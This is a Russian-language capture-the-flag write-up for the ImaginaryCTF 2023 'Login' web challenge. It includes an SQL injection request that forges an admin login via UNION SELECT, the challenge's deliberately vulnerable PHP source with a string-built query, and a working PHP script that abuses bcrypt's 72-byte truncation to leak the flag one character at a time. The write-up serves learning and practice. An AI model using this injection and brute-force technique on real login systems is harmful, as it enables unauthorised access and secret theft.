## ImaginaryCTF 2023 | Web | Login

1. сунул кавычку в поле ввода и получил ошибку
2. sqlmapом дампнул бд. там одна таблица `users` с двумя записями `admin` и `guest` и хэшами в формате `password_hash()`
3. сгенерил хэш из `123` и используя `sqli` вошел в систему под `admin`

```
POST / HTTP/1.1
Host: login.chal.imaginaryctf.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Connection: close
                             
username='+UNION+SELECT+'admin','$2y$10$y8lGakdsoJPKhHZDNCwYfOyG.2fdIjBO2sPMRpUWjNVMjwguhPqCi'--&password=123
```

получил такой ответ

```
...
Welcome admin! But there is no flag here :P<!-- magic: 688a35c685a7a654abc80f8e123ad9f0 --> 
...
```

я долго проебался пока мне не подсказали перейти на `/?source` 🗿

<details>
  <summary>сорцы</summary>

  ```php
<?php

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
$db = new SQLite3('/db.sqlite3');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$msg = '';

if (isset($_GET[$magic])) {
    $password .= $flag;
}

if ($username && $password) {
    $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
    if (!$res) {
        $msg = "Invalid username or password";
    } else if (password_verify($password, $res['pwhash'])) {
        $u = htmlentities($res['username']);
        $msg = "Welcome $u! But there is no flag here :P";
        if ($res['username'] === 'admin') {
            $msg .= "<!-- magic: $magic -->";
        }
    } else {
        $msg = "Invalid username or password";
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <link type="text/css" rel="stylesheet" href="https://cdn.simplecss.org/simple.css" />
</head>

<body>
    <main>
        <h2>Login</h2>
        <form method="POST">
            <p>
                <label for="username">Username</label>
                <input type="text" name="username" placeholder="Username" />
            </p>
            <p>
                <label for="password">Password</label>
                <input type="password" name="password" placeholder="Password" />
            </p>
            <p>
                <button type="submit">Login</button>
            </p>
        </form>
        <p>
            <?= $msg ?>
        </p>
    </main>
</body>

</html>
<!-- /?source -->
```
</details>


с сорцами все встало на свои места. получается, если гет параметр имеет значение `magic`, тогда `flag` конкатенируется с `password`. Хм 🤔.
Единственное место, где `password` еще используется, это функция `password_verify()`. я зашел в [доку пыхи](https://www.php.net/manual/en/function.password-hash.php) и обнаружил странную хрень

> **Предостережение** Использование алгоритма **PASSWORD_BCRYPT** приведёт к обрезанию поля password до максимальной длины 72 байта.

теперь вектор понятен. поскольку мы знаем об ограничении длины, мы можем хэшировать паддинг, оставляя место для флага, и угадывать посимвольно. Я написал простой скрипт на пыхе, который достал мне флаг:

```php
<?php

$charlist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_', '!', '?', '{', '}'];

$url = 'http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0';

$flag = 'ictf{';
echo "\n\n\n";
while ($flag[strlen($flag) - 1] != '}') {
  $padding = str_repeat("%", 71 - strlen($flag));
  for($i = 0; $i < count($charlist); ++$i) {
          $pass = "$padding$flag$charlist[$i]";
          $hash = password_hash($pass, PASSWORD_BCRYPT);
  
          $result = file_get_contents($url, false, stream_context_create([
            'http' => [
                'method' => 'POST',
                'header'  => "Content-type: application/x-www-form-urlencoded",
                'content' => "username='+UNION+SELECT+'admin','$hash'--&password=$padding",
            ]
          ]));

          if (str_contains($result, 'magic: 688a35c685a7a654abc80f8e123ad9f0')) {
            $flag .= $charlist[$i];
            echo $flag . "\r"; 
            break;
          }
  }
}

?>
```


https://github.com/kar9eo/wr/assets/138859197/e4b6c2e5-ff3e-4e20-82b0-a072c1ce1860

